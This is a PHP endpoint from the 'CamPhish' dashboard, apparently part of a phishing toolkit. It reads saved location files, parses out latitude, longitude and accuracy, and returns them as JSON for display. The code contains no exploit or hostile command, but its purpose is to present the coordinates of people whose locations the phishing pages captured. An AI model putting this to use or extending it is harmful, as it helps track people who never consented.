<?php
/**
 * CamPhish Dashboard API - Get Locations
 * Author: Rahul Kushwaha
 * Returns parsed location data from location files
 */

header('Content-Type: application/json');
header('Cache-Control: no-cache, must-revalidate');

// Base path to the root CamPhish directory (relative to this API file location)
$basePath = dirname(dirname(__DIR__));

$locations = [];

// Get location files from saved_locations directory
$savedLocations = glob($basePath . '/saved_locations/*.txt');
if (is_array($savedLocations)) {
    foreach ($savedLocations as $file) {
        $location = parseLocationFile($file);
        if ($location) {
            $locations[] = $location;
        }
    }
}

// Get location files from root directory
$rootLocations = glob($basePath . '/location_*.txt');
if (is_array($rootLocations)) {
    foreach ($rootLocations as $file) {
        $location = parseLocationFile($file);
        if ($location) {
            $locations[] = $location;
        }
    }
}

// Sort by filename (timestamp) descending
usort($locations, function($a, $b) {
    return strcmp($b['filename'], $a['filename']);
});

echo json_encode($locations);

/**
 * Parse a location file and extract lat, lon, accuracy
 */
function parseLocationFile($filepath) {
    if (!file_exists($filepath) || !is_readable($filepath)) {
        return null;
    }
    
    $content = file_get_contents($filepath);
    if ($content === false) {
        return null;
    }
    
    $lat = null;
    $lon = null;
    $accuracy = null;
    
    // Parse latitude
    if (preg_match('/Latitude:\s*([\d.-]+)/', $content, $matches)) {
        $lat = $matches[1];
    }
    
    // Parse longitude
    if (preg_match('/Longitude:\s*([\d.-]+)/', $content, $matches)) {
        $lon = $matches[1];
    }
    
    // Parse accuracy
    if (preg_match('/Accuracy:\s*([\d.]+)/', $content, $matches)) {
        $accuracy = $matches[1];
    }
    
    if ($lat === null || $lon === null) {
        return null;
    }
    
    return [
        'lat' => $lat,
        'lon' => $lon,
        'accuracy' => $accuracy,
        'filename' => basename($filepath)
    ];
}
